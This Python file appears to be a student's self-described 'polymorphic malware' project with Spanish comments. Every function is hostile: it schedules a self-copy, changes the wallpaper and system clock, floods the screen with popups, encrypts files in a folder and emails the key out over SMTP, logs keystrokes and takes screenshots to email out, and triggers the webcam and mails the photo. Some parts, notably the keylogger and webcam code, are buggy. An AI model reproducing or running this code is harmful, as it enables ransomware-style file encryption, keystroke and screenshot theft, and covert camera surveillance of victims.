import os, base64, logging, threading, sched, time, shutil, ctypes, random, pyautogui, subprocess, smtplib, pynput
import tkinter as tk
from pynput.keyboard import Listener
from tkinter import messagebox
from PIL import ImageGrab
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage


def task1():

    def copy_file():
        # Ruta de la carpeta de origen
        src = 'C:\\Users\\User\\Desktop\\PolymorphicMalware\\FINAL-PM-1.py'
        # Ruta de la carpeta de destino
        dst = '\\Users\\User\\Downloads'
        shutil.copy2(src, dst)
        print("\nArchivo copiado con éxito.\n")

    s = sched.scheduler(time.time, time.sleep)

    execute_time = (2023, 1, 17, 12, 0, 0, 0, 0, 0)

    s.enterabs(time.mktime(execute_time), 1, copy_file, ())
    s.run()

def task2():

    # Ruta de la imagen que se desea usar como fondo de pantalla
    ruta_imagen = "\\Users\\User\\Desktop\\PolymorphicMalware\\USTEDHASIDOINFECTADO.jpeg"

    ctypes.windll.user32.SystemParametersInfoW(20, 0, ruta_imagen, 0)
    print("\nFondo de pantalla cambiado con éxito.\n")

    # Define la nueva fecha y hora
    new_date = (2023, 1, 16, 12, 0, 0, 0, 0)

    # Crea una estructura SYSTEMTIME para almacenar la nueva fecha y hora
    date = ctypes.c_long * 8
    new_time = date(*new_date)

    # Usa la función SetLocalTime para establecer la nueva fecha y hora
    ctypes.windll.kernel32.SetLocalTime(ctypes.byref(new_time))


def task3():

    def create_popup():
        x = random.randint(0, 500)
        y = random.randint(0, 500)
        popup = tk.Toplevel()
        popup.geometry("+%d+%d" % (x, y))
        label = tk.Label(popup, text="USTED HA SIDO INFECTADO POR UN MALWARE DIVERTIDO")
        label.pack()

    messagebox.showwarning("ALERTA", "USTED HA SIDO INFECTADO POR UN MALWARE DIVERTIDO")

    def on_control_c(event):
        [create_popup() for _ in range(100)]
        pyautogui.PAUSE = 0.5

    root = tk.Tk()
    root.bind("<Control-c>", on_control_c)
    root.mainloop()


def task4():

    def encrypt_files(path, password):
        for root, dirs, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()
                fernet = Fernet(password)
                encrypted = fernet.encrypt(data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted)

    def send_email(password):
        server = smtplib.SMTP('smtp.outlook.com', 587)
        server.starttls()
        # Por motivos de seguridad clave NO EXPUESTA en código fuente.
        server.login("1093141@est.intec.edu.do", "000000")
        message = "Encryption key: {}".format(password)
        server.sendmail("1093141@est.intec.edu.do", "1093141@est.intec.edu.do", message)
        server.quit()

    password = b'pBBRxb_XILBX_z5PTVx4o_tN351f6HT3gcLRVrVs7R8='
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256,
        length=32,
        salt=b'salt_',
        iterations=100000,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    encrypt_path = '\\Users\\User\\Desktop\\PolymorphicMalware\\Gatitos'

    subprocess.Popen(['calc.exe'])
    encrypt_files(encrypt_path, key)
    send_email(key)


def task5():
    logging.basicConfig(filename=("Keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()

    keyboard_controller = pynput.keyboard.Controller()
    keylogs = ""

    def take_screenshot():
        screenshot = ImageGrab.grab()
        screenshot_name = "screenshot_" + str(time.time()) + ".png"
        screenshot.save(screenshot_name)
        return screenshot_name

    def send_email(screenshot_name, keylogs):
        msg = MIMEMultipart()
        msg['From'] = "1093141@est.intec.edu.do"
        msg['To'] = "1093141@est.intec.edu.do"
        msg['Subject'] = "Screenshot and keylogs"
        text = MIMEText(keylogs)
        msg.attach(text)
        with open(screenshot_name, 'rb') as f:
            img_data = f.read()
        image = MIMEImage(img_data, name='Screenshot')
        msg.attach(image)
        s = smtplib.SMTP('smtp.office365.com', 587)
        s.starttls()
        s.login("1093141@est.intec.edu.do", "000000")
        s.send_message(msg)
        s.quit()

    def on_press(key):
        global keylogs
        try:
            current_time = str(time.time())
            keylogs += current_time + " Key {0} pressed\n".format(key.char)
        except AttributeError:
            keylogs += current_time + " Special key {0} pressed\n".format(key)

    def on_release(key):
        global keylogs
        try:
            current_time = str(time.time())
            keylogs += current_time + " Key {0} released\n".format(key.char)
        except AttributeError:
            keylogs += current_time + " Special key {0} released\n".format(key)

    def start_keylogging():
        with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    def on_control_v(event):
        screenshot_thread = threading.Thread(target=lambda: [take_screenshot() for _ in range(10)])
        keylogging_thread = threading.Thread(target=start_keylogging)
        screenshot_thread.start()
        time.sleep(60)
        keylogging_thread.start()
        time.sleep(10)
        keylogging_thread.stop()
        screenshot_name = take_screenshot()
        send_email(screenshot_name, keylogs)


def task6():

    def take_photo():
        subprocess.call(["start", "microsoft.windows.camera:"])
        time.sleep(5)
        subprocess.call(["Windows.Camera", "/photo"])
        photo_path = "C:\\Users\\User\\Pictures\\Camera Roll"
        photo_name = "photo_" + str(time.time()) + ".jpg"
        os.rename(photo_path + "photo.jpg", photo_path + photo_name)
        return photo_path + photo_name

    def send_email(photo_name):
        msg = MIMEMultipart()
        msg['From'] = "1093141@est.intec.edu.do"
        msg['To'] = "1093141@est.intec.edu.do"
        msg['Subject'] = "New Photo"
        with open(photo_name, 'rb') as f:
            img_data = f.read()
        image = MIMEImage(img_data, name='photo')
        msg.attach(image)
        s = smtplib.SMTP('smtp.office365.com', 587)
        s.starttls()
        s.login("1093141@est.intec.edu.do", "000000")
        s.send_message(msg)
        s.quit()

    def on_control_x(event):
        photo_name = take_photo()
        send_email(photo_name)

    root = tk.Tk()
    root.bind("<Control-x>", on_control_x)
    root.mainloop()


def main():

    task1()
    task2()
    task3()
    task4()
    task5()
    task6()


if __name__ == "__main__":
    main()